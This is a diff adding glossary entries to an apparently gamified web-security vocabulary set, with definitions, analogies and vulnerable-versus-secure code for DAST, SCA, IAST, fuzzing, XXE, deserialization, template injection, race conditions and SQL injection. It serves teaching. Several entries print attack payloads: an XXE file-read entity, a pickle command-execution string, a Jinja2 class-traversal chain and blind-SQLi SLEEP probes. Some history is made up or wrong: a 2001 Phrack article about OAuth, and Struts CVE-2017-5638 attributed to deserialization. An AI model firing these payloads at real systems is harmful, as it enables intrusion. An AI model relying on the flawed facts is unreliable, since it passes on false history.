+      "simpleDefinition": "DAST tools attack your running application from the outside, the way a real attacker would — fuzzing endpoints, testing authentication flows, checking security headers, probing for injection. They require a deployed environment but find vulnerabilities that code analysis misses: misconfigured middleware, unexpected interactions between components, and runtime authentication failures.",
+      "longDefinition": "Dynamic Application Security Testing (DAST) tests a running application from the outside, mimicking an external attacker's perspective. Unlike SAST, which reads code without running it, DAST exercises the actual running system — HTTP endpoints, authentication flows, session management, input validation — and reports on observable behavior. DAST strengths: low false-positive rates (if the tool confirms an injection by extracting data, the finding is real), discovery of runtime misconfigurations (missing security headers, permissive CORS policies, insecure TLS settings), authentication and session vulnerabilities (session fixation, JWT algorithm confusion), and integration-layer vulnerabilities that are invisible at the code level. DAST limitations: requires a stable deployed environment (typically staging), cannot find vulnerabilities in code paths that are not reachable via HTTP, and may miss business-logic vulnerabilities that require application-specific context. Major DAST tools include OWASP ZAP (open-source, widely used in CI), Burp Suite Pro (manual + automated), Nikto, and commercial platforms like HCL AppScan. In CI/CD pipelines, DAST typically runs against an ephemeral staging environment as a post-deployment gate before promotion to production. The combination of SAST at commit time and DAST at staging provides complementary coverage — SAST finds what code looks dangerous, DAST finds what the running system actually does.",
+      "connector": "DAST is a burglar who tries every window and door on your house while you're in it — not reading the blueprints, but actually testing whether each lock holds under pressure, discovering that the back door was left unlocked despite the blueprint showing it secured.",
+      "techContext": "Integrating OWASP ZAP's baseline scan into a CI pipeline with `zap-baseline.py -t https://staging.example.com` provides automated discovery of common misconfigurations and injection points with no manual configuration.",
+      "exampleSentence": "DAST against the staging environment revealed a reflected XSS in the error message path that SAST had missed because the vulnerability arose from a third-party template library, not first-party code.",
+      "codeExample": {
+        "language": "yaml",
+        "code": "# GitHub Actions: OWASP ZAP DAST baseline scan\njobs:\n  dast:\n    runs-on: ubuntu-latest\n    needs: deploy-staging\n    steps:\n      - name: ZAP Baseline Scan\n        uses: zaproxy/action-baseline@v0.10.0\n        with:\n          target: 'https://staging.example.com'\n          rules_file_name: '.zap/rules.tsv'\n          fail_action: true\n          issue_title: 'DAST Baseline Scan'"
+      },
+      "etymology": "DAST is a Gartner-coined acronym from the early 2010s, distinguishing tools that test running applications (dynamic) from those that analyze code statically (SAST); the category encompasses web application scanning and API fuzzing.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "testing", "devsecops", "tooling"],
+      "category": "testing"
+    },
+    {
+      "id": "web-adv-0130-0000-0000-0000-000000000013",
+      "word": "SCA",
+      "pronunciation": "ES-see-AY",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Software Composition Analysis; inventories open-source dependencies and checks them against known CVE databases.",
+      "simpleDefinition": "SCA tools scan your project's dependency tree — direct and transitive dependencies — and cross-reference every package version against vulnerability databases like the NVD and GitHub Advisory Database. When Log4Shell or OpenSSL vulnerabilities drop, SCA tells you within minutes which of your services are affected and which versions to upgrade to.",
+      "longDefinition": "Software Composition Analysis (SCA) addresses the reality that modern applications are composed mostly of third-party open-source libraries. In a typical Node.js or Python application, first-party code may represent less than 10% of total executable lines; the rest is dependencies. SCA tools generate a dependency inventory (equivalent to an SBOM) and check every package against CVE databases including the National Vulnerability Database (NVD), GitHub Advisory Database, Snyk Vulnerability DB, and OSV.dev. SCA runs at build time or on every dependency installation and provides immediate feedback on vulnerable packages, along with remediation guidance (safe upgrade versions or mitigations). Beyond CVE matching, advanced SCA tools perform reachability analysis — determining whether the vulnerable function in a dependency is actually called by the application code, dramatically reducing false positives. SCA also covers license compliance, flagging copyleft licenses (GPL, AGPL) that may impose obligations in commercial software. Leading SCA tools include Snyk Open Source, Dependabot (GitHub-native, free), OWASP Dependency-Check, Mend.io (formerly WhiteSource), and Trivy (container + dependency scanning). The 2021 Log4Shell vulnerability demonstrated SCA's value: organizations with mature SCA programs identified all affected services within hours; those without took weeks of manual auditing.",
+      "connector": "SCA is like a food recall notification system for code — when a supplier announces that a specific batch of an ingredient is contaminated, your inventory system automatically flags every dish that used that batch, so you know exactly what to pull from the menu.",
+      "techContext": "Running `snyk test` as a CI gate with `--severity-threshold=high` blocks merges when any direct or transitive dependency contains a known high- or critical-severity CVE, while `--fail-on=upgradable` limits noise to only actionable findings.",
+      "exampleSentence": "The SCA scan flagged a transitive dependency on Log4j 2.14.1 in three services within minutes of CVE-2021-44228 publication, enabling the team to patch before any public exploit code was circulated.",
+      "codeExample": {
+        "language": "yaml",
+        "code": "# GitHub Dependabot SCA configuration (.github/dependabot.yml)\nversion: 2\nupdates:\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"daily\"\n    open-pull-requests-limit: 10\n    reviewers:\n      - \"security-team\"\n\n  - package-ecosystem: \"docker\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\""
+      },
+      "etymology": "SCA as a distinct testing category was named by Gartner and popularized by vendors like Snyk and Black Duck (now Synopsis) in the mid-2010s, as open-source dependency use surged and high-profile vulnerabilities in shared libraries demonstrated the risk.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "testing", "devsecops", "supply-chain"],
+      "category": "testing"
+    },
+    {
+      "id": "web-adv-0140-0000-0000-0000-000000000014",
+      "word": "IAST",
+      "pronunciation": "EYE-ast",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Interactive Application Security Testing; instruments the running app internally while tests exercise it.",
+      "simpleDefinition": "IAST instruments the application from the inside — adding sensors to the runtime that observe data flows as automated tests or real traffic exercises the application. Because IAST sees actual tainted data moving through actual code paths, it has very low false-positive rates and finds vulnerabilities that neither SAST nor DAST can detect in isolation.",
+      "longDefinition": "Interactive Application Security Testing (IAST) embeds a security sensor — typically a Java agent, .NET profiler, or instrumented runtime — directly into the running application. As automated tests, DAST scans, or real traffic exercise the application, the IAST agent monitors data flows in real time: it tracks whether HTTP request parameters flow into SQL queries without parameterization, whether deserialized objects from the network reach dangerous methods, whether cryptographic APIs are called with insecure parameters. Because IAST observes actual execution of actual code with actual data, it achieves near-zero false-positive rates for the code paths that are exercised — it is not guessing about what might happen statically, it is reporting what did happen dynamically. IAST's principal limitation is coverage: vulnerabilities in code paths not exercised during the test session remain invisible. The technique is most effective when combined with high-coverage automated integration test suites that exercise the application's full API surface. IAST differs from RASP (Runtime Application Self-Protection) in intent: IAST is a testing-time diagnostic tool that reports findings to developers; RASP is a production-time defense that blocks attacks in real time. Tools include Contrast Security (the category creator), Seeker (Synopsys), HCL AppScan, and Checkmarx IAST.",
+      "connector": "IAST is like a doctor who instruments a patient with wireless biosensors and then has them run on a treadmill — instead of guessing from a static scan what might happen under exertion, it observes the actual heart rate, oxygen, and blood pressure in real time as stress is applied.",
+      "techContext": "Deploying a Contrast IAST agent to the integration test environment and running the full API test suite provides near-zero false-positive taint-analysis results without modifying application code, surfacing vulnerabilities that SAST's static analysis missed.",
+      "exampleSentence": "IAST discovered a second-order SQL injection vulnerability that SAST missed entirely because the tainted data was stored in the database during one request and used in a query during a completely different request two test steps later.",
+      "codeExample": {
+        "language": "yaml",
+        "code": "# GitHub Actions: run integration tests with Contrast IAST agent (Java)\njobs:\n  iast:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Download Contrast agent\n        run: |\n          curl -Lo contrast.jar \\\n            https://repo1.maven.org/maven2/com/contrastsecurity/contrast-agent/latest/contrast-agent-latest.jar\n      - name: Run tests with IAST instrumentation\n        run: |\n          java -javaagent:contrast.jar \\\n               -Dcontrast.api.url=${{ secrets.CONTRAST_URL }} \\\n               -Dcontrast.api.api_key=${{ secrets.CONTRAST_API_KEY }} \\\n               -jar app.jar &\n          sleep 10\n          mvn test"
+      },
+      "etymology": "IAST was named and defined as a category by Contrast Security (founded 2014), which positioned it between SAST (static, before execution) and DAST (dynamic, from outside) to fill the hybrid gap.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "testing", "devsecops", "tooling"],
+      "category": "testing"
+    },
+    {
+      "id": "web-adv-0150-0000-0000-0000-000000000015",
+      "word": "fuzzing",
+      "pronunciation": "FUZZ-ing",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Automated testing that feeds malformed or random inputs to find crashes, hangs, and unexpected behavior.",
+      "simpleDefinition": "Fuzzing bombards a program with unexpected, malformed, or randomly mutated inputs and watches for crashes, memory corruption, assertion failures, or hangs. Modern coverage-guided fuzzers like AFL++ and libFuzzer track which code branches each input exercises and mutate inputs to explore new paths — finding vulnerabilities in parsers, serializers, and protocol handlers that humans would never test manually.",
+      "longDefinition": "Fuzzing (fuzz testing) is an automated software testing technique that generates large volumes of unexpected, invalid, or random inputs and feeds them to a target program, monitoring for crashes, assertion failures, memory corruption errors, or security policy violations. Fuzzing has evolved from random byte generation (\"dumb fuzzing\") to coverage-guided fuzzing, where the fuzzer instruments the target binary to track code branch coverage and uses feedback to mutate inputs toward unexplored paths. Coverage-guided fuzzers — AFL (American Fuzzy Lop), AFL++, libFuzzer, and Honggfuzz — have discovered thousands of high-severity CVEs in critical infrastructure: zlib, OpenSSL, SQLite, browsers, kernels, and protocol parsers. Google's OSS-Fuzz continuously fuzzes over 1,000 open-source projects and has found over 10,000 vulnerabilities. In application security, fuzzing is especially effective for: parser vulnerabilities (HTTP, XML, JSON, binary protocols), deserialization bugs, integer overflows in length calculations, and memory-safety issues in C/C++ code. For web applications, API fuzzing tools (Burp Suite's Intruder, OWASP ZAP active scan) apply input mutation across HTTP parameters, headers, and request bodies. Fuzzing in CI/CD pipelines (continuous fuzzing) runs fuzz targets in the background and reports new crashes as security findings, catching regressions before they ship.",
+      "connector": "Fuzzing is like a toddler systematically pressing every key combination on a keyboard connected to a system — not guided by any plan, just exploring every possible input sequence with inexhaustible patience, eventually finding the one weird combination that causes the system to crash.",
+      "techContext": "Integrating libFuzzer fuzz targets for all public parsing functions in a C++ network library into the CI pipeline via OSS-Fuzz provides continuous crash detection that catches buffer overflows within hours of introduction rather than years later in production.",
+      "exampleSentence": "Fuzzing the custom binary protocol parser with AFL++ for 48 hours uncovered three out-of-bounds reads and one heap-use-after-free, all of which had been present in production for over two years.",
+      "codeExample": {
+        "language": "cpp",
+        "code": "// libFuzzer fuzz target — fuzz a custom packet parser\n#include <cstdint>\n#include <cstddef>\n\n// Function under test\nextern void parse_packet(const uint8_t* data, size_t len);\n\n// libFuzzer calls this repeatedly with mutated inputs\nextern \"C\" int LLVMFuzzerTestOneInput(\n    const uint8_t* data, size_t size) {\n    parse_packet(data, size);  // crash = vulnerability found\n    return 0;\n}\n// Compile: clang++ -fsanitize=fuzzer,address fuzz_target.cpp -o fuzz\n// Run:     ./fuzz -max_total_time=3600 corpus/"
+      },
+      "etymology": "\"Fuzzing\" was coined by Professor Barton Miller at the University of Wisconsin-Madison in 1988 during a research project testing Unix utilities with random input; his original fuzz paper established the field of fuzz testing.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "testing", "devsecops"],
+      "category": "testing"
+    },
+    {
+      "id": "web-adv-0160-0000-0000-0000-000000000016",
+      "word": "XXE",
+      "pronunciation": "EX-ex-EE",
+      "partOfSpeech": "noun",
+      "shortDefinition": "XML External Entity injection; malicious entity declaration causes the XML parser to read local files or make SSRF requests.",
+      "simpleDefinition": "XXE exploits XML parsers that process external entity declarations in DTDs. An attacker crafts XML with an entity that resolves to a local file path (`file:///etc/passwd`) or an internal URL. When the server parses the XML, the entity is expanded and its contents appear in the response — or in an out-of-band channel in the blind variant. The fix: disable external entity processing in the XML parser.",
+      "longDefinition": "XML External Entity (XXE) injection is a vulnerability in XML parsers that expand external entity references defined in Document Type Declarations (DTDs). The SYSTEM keyword in a DTD entity declaration causes the parser to fetch the entity's content from an external resource — a local file, a network URL, or even a PHP wrapper — and substitute it into the parsed document. A classic exploitation payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>` causes the parser to read `/etc/passwd` and include its contents in the parsed XML, which the application may then return to the attacker, log, or store. Beyond local file disclosure, XXE can trigger SSRF by using `http://` URIs that reach internal services, port scanning via timing differences, and denial of service via the \"billion laughs\" entity expansion attack. XXE vulnerabilities affect any application that parses user-supplied XML without disabling external entity processing: file upload handlers, API endpoints accepting XML, SAML authentication libraries, and document converters. The fix is universal: disable DTD processing or specifically disable external entity loading in the parser configuration. XXE is part of OWASP A05:2021 (Security Misconfiguration) and has been the source of major vulnerabilities in Java, .NET, PHP, and Python XML libraries.",
+      "connector": "XXE is like a fill-in-the-blank form that secretly calls an outside service to look up the answer before you see it — the XML parser is instructed to fetch content from a file or URL and paste it into the document, with the attacker choosing what to fetch.",
+      "techContext": "The PayPal 2013 XXE vulnerability allowed attackers to read arbitrary files from the server by submitting XML to the account-settings API with a SYSTEM entity pointing to `/etc/passwd`.",
+      "exampleSentence": "The penetration tester confirmed XXE in the invoice-parsing feature by submitting a DOCTYPE declaration pointing to `file:///etc/shadow` and receiving the first line of the shadow file in the server's error response.",
+      "codeExample": {
+        "language": "python",
+        "code": "# VULNERABLE — default lxml/ElementTree may resolve external entities\nimport xml.etree.ElementTree as ET\ntree = ET.parse(user_upload)  # dangerous if DTD processing is enabled\n\n# SECURE — use defusedxml (safe XML parsing library)\nimport defusedxml.ElementTree as ET\ntree = ET.parse(user_upload)  # external entities disabled by default\n\n# Or manually disable in lxml:\nfrom lxml import etree\nparser = etree.XMLParser(\n    resolve_entities=False,\n    no_network=True,\n    load_dtd=False,\n)\ntree = etree.parse(user_upload, parser)"
+      },
+      "etymology": "XXE acronym stands for XML eXternal Entity; the vulnerability class was first described publicly by Enoxman in 2002 and appeared in the OWASP Top 10 from 2013 to 2017 as a standalone category; it was merged into Security Misconfiguration in the 2021 edition.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "injection", "xml"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0170-0000-0000-0000-000000000017",
+      "word": "insecure deserialization",
+      "pronunciation": "in-suh-KYOOR dee-SER-ee-ul-eye-ZAY-shun",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Application deserializes untrusted data without integrity checks, often allowing remote code execution.",
+      "simpleDefinition": "Insecure deserialization occurs when an application converts untrusted byte streams back into objects without verifying their integrity or structure first. Many serialization formats (Java serialization, Python pickle, PHP unserialize) will instantiate arbitrary classes and call their constructors when deserializing — giving an attacker who controls the input the ability to execute arbitrary code on the server.",
+      "longDefinition": "Deserialization is the reverse of serialization: converting a byte stream or structured data format back into an in-memory object graph. Insecure deserialization (OWASP A08:2021) occurs when an application deserializes attacker-controlled data without cryptographic integrity verification or type restrictions. The severity is format-dependent: Java's native serialization (`ObjectInputStream.readObject()`) instantiates every class referenced in the stream and calls lifecycle methods (`readObject`, `readResolve`, `finalize`) during deserialization — attackers chain these calls across classes in the application's classpath (a \"gadget chain\") to achieve remote code execution without calling any single obviously dangerous method. Python's `pickle` format executes arbitrary Python code during unpickling — `__reduce__` returns a callable and arguments that are invoked on deserialization. PHP's `unserialize()` triggers `__wakeup()` and `__destruct()` magic methods. The Apache Struts 2 CVE-2017-5638 (used in the Equifax breach) and the Jenkins Remote Code Execution vulnerabilities were both rooted in insecure deserialization. Defenses: never deserialize untrusted data in dangerous formats; prefer safe data-interchange formats (JSON, Protocol Buffers) that do not instantiate arbitrary types; if using Java serialization, use serialization filters (java.io.ObjectInputFilter, NIST guidance) to allowlist expected classes; sign or HMAC-protect serialized data before transmitting it.",
+      "connector": "Insecure deserialization is like accepting a flatpack furniture box from a stranger and assembling it without opening it first — you trust the contents to be a table, but the instructions inside say \"step one: delete all your files\" and your tools follow them automatically.",
+      "techContext": "The ysoserial tool generates Java deserialization gadget chain payloads for popular libraries (Commons Collections, Spring, Groovy) that achieve RCE when passed to a vulnerable `ObjectInputStream.readObject()` call.",
+      "exampleSentence": "The attacker exploited insecure deserialization in the session cookie by replacing the Base64-encoded Java serialized object with a ysoserial payload, triggering remote code execution on the application server when the session was read.",
+      "codeExample": {
+        "language": "python",
+        "code": "# VULNERABLE — Python pickle RCE\nimport pickle, base64\n\n# Attacker-controlled payload — executes os.system on deserialization\npayload = b\"\"\"cos\\nsystem\\n(S'id > /tmp/pwned'\\ntR.\"\"\"\npickle.loads(payload)  # executes system command during deserialization\n\n# SECURE — use JSON for untrusted data interchange\nimport json\ndata = json.loads(user_input)  # no code execution, only data types"
+      },
+      "etymology": "\"Deserialization\" is standard computer-science terminology for the reconstruction of objects from serialized byte streams; the \"insecure\" qualifier was formalized by OWASP when it joined the Top 10 in 2017.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "injection", "rce"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0180-0000-0000-0000-000000000018",
+      "word": "template injection",
+      "pronunciation": "TEM-plut in-JEK-shun",
+      "partOfSpeech": "noun",
+      "shortDefinition": "User input reaches a server-side template engine without sanitization, enabling code execution via template syntax.",
+      "simpleDefinition": "Template injection occurs when user-supplied content is rendered directly through a server-side template engine (Jinja2, Twig, FreeMarker, Velocity) rather than being passed as data to a safe template. Template engines are designed to execute code — expressions, conditionals, loops — so injecting template syntax into an unsanitized rendering path turns user input into server-side code execution.",
+      "longDefinition": "Server-Side Template Injection (SSTI) is a critical vulnerability that arises when user-controlled input is embedded into a template and rendered by a template engine before being returned as output. Template engines — Jinja2 (Python/Flask), Twig (PHP), FreeMarker (Java), Velocity (Java), Pebble, Mako, Smarty — are explicitly designed to execute expressions: variable lookups, conditional logic, loops, and in many cases arbitrary code via helper functions or filter chains. When an application passes user input as part of the template source rather than as a template variable, the engine interprets the input as template instructions. Detection is simple: submitting `{{7*7}}` and receiving `49` in the response confirms Jinja2 or Twig injection; `${7*7}` for FreeMarker or Velocity. Exploitation escalates from information disclosure (reading environment variables, configuration files) to arbitrary OS command execution via object introspection chains. In Jinja2, the payload `{{ ''.__class__.__mro__[1].__subclasses__() }}` traverses Python's class hierarchy to locate subprocess-related classes and execute system commands. SSTI differs from XSS in that the code executes on the server, not in the browser — the impact is remote code execution with the web server's privileges. The root-cause fix is never to pass user input as template source: always render a fixed template with user data passed as template variables.",
+      "connector": "Template injection is like giving someone a fill-in form for a birthday card and discovering they wrote executable code in the name field — the card-printing machine follows the code because it was designed to execute instructions, not just display text.",
+      "techContext": "Detecting SSTI in a Flask/Jinja2 application: submit `{{config}}` as a name field value; if the server returns the application's full config dictionary (including secret keys), SSTI is confirmed.",
+      "exampleSentence": "The attacker confirmed SSTI in the email-template preview feature by injecting `{{7*7}}` and receiving `49`, then escalated to full RCE by crafting a Jinja2 subclass chain payload.",
+      "codeExample": {
+        "language": "python",
+        "code": "from jinja2 import Template, Environment, select_autoescape\n\n# VULNERABLE — renders user input as template source\ndef render_greeting(name: str) -> str:\n    return Template(f\"Hello {name}!\").render()  # SSTI if name contains {{}}\n\n# SECURE — pass user input as a template variable, not template source\nenv = Environment(autoescape=select_autoescape())\n\ndef render_greeting(name: str) -> str:\n    tmpl = env.from_string(\"Hello {{ name }}!\")   # fixed template\n    return tmpl.render(name=name)                  # name is data, not code"
+      },
+      "etymology": "SSTI was first systematically documented and named by James Kettle (PortSwigger) in a 2015 blog post and Black Hat presentation that coined the term \"Server-Side Template Injection\" and described payload chains across multiple template engines.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "injection", "rce"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0190-0000-0000-0000-000000000019",
+      "word": "race condition",
+      "pronunciation": "RAYS kun-DISH-un",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Security flaw arising when concurrent requests exploit a window between a check and an action (TOCTOU).",
+      "simpleDefinition": "A race condition vulnerability occurs when two concurrent requests exploit the gap between a security check and the action it was supposed to gate. One request reads the shared state (\"this coupon hasn't been used yet\"), a second request reads the same state concurrently, and both proceed to act on the old value — using the coupon twice, double-withdrawing funds, or bypassing a rate limit.",
+      "longDefinition": "Race conditions in web application security are a subset of TOCTOU (Time-of-Check to Time-of-Use) vulnerabilities specifically exploited by concurrent HTTP requests. They arise when two or more requests interact with shared state — a database row, a file, an in-memory counter — without sufficient atomicity guarantees between the read (check) and write (update) operations. Classic examples: gift card or coupon reuse (a coupon status is read as \"unused\" by two simultaneous redemption requests before either marks it \"used\"); double-spend in payment systems (a balance is checked as sufficient by two withdrawals before either deducts); account limit bypass (a rate-limited resource is checked before incrementing); and password reset token invalidation (a reset token is validated but the invalidation write races with a second use of the same token). The Portswigger Web Security Academy introduced \"single-packet attacks\" for HTTP/2, where multiple requests are sent in a single TCP segment, ensuring they arrive at the server simultaneously and maximizing the exploitation window. Defenses include: atomic database operations (`UPDATE ... WHERE balance >= amount` as a single statement); database-level row locking (`SELECT FOR UPDATE`); idempotent writes with unique constraint enforcement; Redis atomic operations or Lua scripts; and optimistic concurrency with version counters.",
+      "connector": "A race condition is like two shoppers who both see the last item on the shelf at the same moment, put it in their carts simultaneously, and both check out successfully — the inventory system checked before either purchase was recorded, so it allowed both.",
+      "techContext": "HTTP/2 single-packet attacks allow sending 20+ requests in a single TCP segment, collapsing timing windows to microseconds and making many race conditions that were previously theoretical into reliably exploitable vulnerabilities.",
+      "exampleSentence": "The penetration tester exploited a race condition in the cryptocurrency withdrawal endpoint by sending 50 simultaneous withdrawal requests for the full account balance, with several completing before the balance was decremented.",
+      "codeExample": {
+        "language": "python",
+        "code": "# VULNERABLE — check and update are separate database calls\ndef redeem_coupon(user_id: int, coupon_code: str):\n    coupon = db.get(Coupon, coupon_code)\n    if coupon.used:  # check\n        raise ValueError(\"Already used\")\n    coupon.used = True  # update (race window between these two lines)\n    db.commit()\n\n# SECURE — atomic UPDATE with WHERE condition (no race window)\ndef redeem_coupon(user_id: int, coupon_code: str):\n    rows_updated = db.execute(\n        \"UPDATE coupons SET used=TRUE, used_by=? \"\n        \"WHERE code=? AND used=FALSE\",  # atomic check + update\n        (user_id, coupon_code)\n    ).rowcount\n    if rows_updated == 0:\n        raise ValueError(\"Already used or not found\")"
+      },
+      "etymology": "\"Race condition\" is a hardware engineering term from the 1950s (transistor switching timing) that was adopted into software engineering; the security exploitation dimension was formalized with TOCTOU literature in the 1990s and web exploitation techniques in the 2020s.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "logic-flaws", "concurrency"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0200-0000-0000-0000-000000000020",
+      "word": "TOCTOU",
+      "pronunciation": "TOK-too",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Time-of-Check to Time-of-Use; attacker modifies a resource between the validation step and the action that uses it.",
+      "simpleDefinition": "TOCTOU is the general class of vulnerability where a program checks a condition (\"is this file safe to read?\") and then uses the resource it checked (\"read the file\") — but an attacker changes the resource between those two moments, invalidating the check. The check and the use must be atomic; when they are not, the window between them is exploitable.",
+      "longDefinition": "Time-of-Check to Time-of-Use (TOCTOU) is the formal security term for the gap between verifying a condition and acting on that condition when another party can change the state in between. The pattern appears at every level of the software stack: filesystem TOCTOU (checking a file's permissions before opening it; an attacker swaps a symlink between the check and the open, redirecting the operation to a privileged file — the classic Unix `tmp` attack exploited this pattern in SUID binaries); database TOCTOU (reading a balance and writing a debit as two non-atomic operations, exploitable by concurrent requests as described under race conditions); cryptographic TOCTOU (verifying a MAC over a request body but not binding the header fields, allowing a header to be swapped after verification); and web application TOCTOU (verifying a CSRF token but not consuming it atomically with the action it protects). TOCTOU defenses require closing the window entirely: use atomic primitives that check and act in a single indivisible step — `rename(2)` instead of `stat + open`, `UPDATE ... WHERE ... = expected_value` instead of `SELECT + UPDATE`, database transactions with appropriate isolation levels, or lock acquisition before both check and action. The 2024 Portswigger research into HTTP/2 single-packet race windows demonstrated that web-layer TOCTOU windows as small as microseconds are practically exploitable.",
+      "connector": "TOCTOU is like a bouncer who checks IDs at the door, turns away to let someone else in, and by the time the first group walks through the door someone has swapped their wristbands — the check and the access were two separate steps with a gap in between.",
+      "techContext": "In filesystem security, the classic TOCTOU exploit in SUID binaries uses `symlink(2)` to atomically swap a regular file path to `/etc/shadow` in the window between `access()` (the check) and `open()` (the use) — prevented by opening with `O_NOFOLLOW` or using capabilities instead of SUID.",
+      "exampleSentence": "The penetration tester exploited a TOCTOU vulnerability in the password reset flow: the reset token was validated in one database query and then consumed in a separate query 12 milliseconds later, a window wide enough to replay the token from a second request.",
+      "codeExample": {
+        "language": "python",
+        "code": "import os\n\n# VULNERABLE filesystem TOCTOU — classic Unix symlink race\ndef read_user_file(path: str) -> bytes:\n    if os.access(path, os.R_OK):      # CHECK: is file readable?\n        # WINDOW: attacker may swap path to a symlink here\n        with open(path, 'rb') as f:   # USE: open may follow symlink\n            return f.read()\n\n# SECURE — open and then check ownership atomically\nimport stat\ndef read_user_file(path: str, expected_uid: int) -> bytes:\n    fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW)  # no symlink follow\n    info = os.fstat(fd)                               # stat the open fd\n    if info.st_uid != expected_uid:                   # check AFTER open\n        os.close(fd)\n        raise PermissionError(\"Ownership mismatch\")\n    with os.fdopen(fd, 'rb') as f:\n        return f.read()"
+      },
+      "etymology": "TOCTOU was formally named in Bishop and Dilger's 1996 paper \"Checking for Race Conditions in File Accesses\"; the acronym is pronounced \"tock-too\" and the concept predates the paper in Unix security literature.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "logic-flaws", "concurrency"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0210-0000-0000-0000-000000000021",
+      "word": "second-order SQL injection",
+      "pronunciation": "SEK-und-OR-der ES-KYOO-EL in-JEK-shun",
+      "partOfSpeech": "noun",
+      "shortDefinition": "Payload stored in the database during one request fires later when the app reads it back and embeds it in a new query.",
+      "simpleDefinition": "Second-order SQL injection is a two-phase attack. In phase one, the attacker stores a malicious payload in the database — and the application may correctly escape it during the insert. In phase two, the application reads that stored value and uses it to construct a new SQL query without re-escaping it, triggering the injection. SAST tools and simple code reviews miss this because the injection source and the injection sink are in different code paths.",
+      "longDefinition": "Second-order SQL injection (also called stored or persistent SQL injection) exploits the assumption that data already stored in the database is safe. In a first-order injection, the attacker supplies malicious input directly to a query. In a second-order injection, the attacker first stores a value containing SQL syntax in the database — often through a registration or profile-update endpoint that correctly parameterizes its insert query. Later, when the application reads that stored value (perhaps to populate a query in a different feature, like a search or admin function), it trusts the database-resident value as safe and embeds it directly into a new SQL query without parameterizing it. Classic scenario: an attacker registers with the username `admin'--`, which is safely stored (the INSERT is parameterized). Later, a password-change function reads the username from the session, embeds it into `UPDATE users SET password='...' WHERE username='admin'--'`, effectively stripping the WHERE clause and resetting the admin's password. Detection requires following all data flows from database reads to subsequent query constructions — a cross-request analysis that static scanners and manual reviewers routinely miss. The fix is to parameterize every query that uses any database-originated value, not just queries that use direct HTTP input.",
+      "connector": "Second-order SQL injection is a time-delayed mine: the attacker buries the explosive payload harmlessly during registration, and it detonates only when a completely different part of the application digs it back up and incorporates it into live SQL.",
+      "techContext": "A second-order injection is typically discovered during manual penetration testing or IAST, not SAST, because the injection source (stored username) and the sink (password-change query) are in different request handlers that static analysis treats independently.",
+      "exampleSentence": "The attacker registered with the username `admin'--`, and when the forgot-password feature retrieved that username to build its UPDATE query, the SQL comment dropped the WHERE clause and reset the admin account's password.",
+      "codeExample": {
+        "language": "python",
+        "code": "# Phase 1 — safe INSERT (parameterized)\ndb.execute(\n    \"INSERT INTO users (username, password) VALUES (?, ?)\",\n    (\"admin'--\", hashed_password),   # safely stored\n)\n\n# Phase 2 — VULNERABLE UPDATE reads stored username without re-escaping\nusername = db.execute(\n    \"SELECT username FROM sessions WHERE token = ?\", (token,)\n).fetchone()[0]  # returns: admin'--\n\n# Constructed query becomes:\n# UPDATE users SET password='...' WHERE username='admin'--'\n# The comment (--) drops the WHERE clause\ndb.execute(  # VULNERABLE\n    f\"UPDATE users SET password='{new_hash}' WHERE username='{username}'\"\n)\n# FIX: parameterize the UPDATE, even though username came from the database\ndb.execute(\n    \"UPDATE users SET password=? WHERE username=?\",\n    (new_hash, username)\n)"
+      },
+      "etymology": "\"Second-order\" injection was described in Rix's 2001 Phrack article \"Exploiting Second Order SQL Injection Flaws by Using OAuth\" and later systematized in OWASP guidance; the \"second order\" refers to the two-phase nature of the attack.",
+      "unlockLevel": 4,
+      "tags": ["web-security", "injection", "database"],
+      "category": "vulnerabilities"
+    },
+    {
+      "id": "web-adv-0220-0000-0000-0000-000000000022",
+      "word": "blind SQL injection",
+      "pronunciation": "BLYND ES-KYOO-EL in-JEK-shun",
+      "partOfSpeech": "noun",
+      "shortDefinition": "SQL injection variant that infers data by observing boolean response differences or time delays rather than query output.",
+      "simpleDefinition": "Blind SQL injection exploits an application that doesn't return query results in the response. Instead of reading data directly, the attacker asks the database true/false questions and observes whether the application behaves differently for true versus false answers — or induces deliberate delays to extract data one bit at a time.",
+      "longDefinition": "Blind SQL injection encompasses all injection techniques where the attacker cannot read query results directly. Two primary variants exist: boolean-based blind injection and time-based blind injection. Boolean-based blind injection injects conditions that make the query return zero or one rows (or otherwise change the response), then asks a series of binary questions: `AND SUBSTRING(password,1,1)='a'` — if the page renders normally, the first character is 'a'; if it returns an empty result or error, it is not. By repeating this for each character and position, the attacker extracts arbitrary data one bit at a time. Tools like SQLMap automate this, extracting complete tables in hours. Time-based blind injection uses database delay functions (`SLEEP(5)` in MySQL, `pg_sleep(5)` in PostgreSQL, `WAITFOR DELAY` in MSSQL) to confirm injection and extract data: `AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)` — if the response takes five extra seconds, the character is 'a'. Blind injection works even when the application shows no query output, returns identical pages for all results, and suppresses all error messages — making it the most widely applicable SQL injection technique. Defense is identical to classic SQL injection: parameterized queries prevent all variants including blind.",
+      "connector": "Blind SQL injection is like interrogating a witness who only nods or shakes their head — you can still extract the complete truth by asking enough yes/no questions, just more slowly than if they could speak freely.",
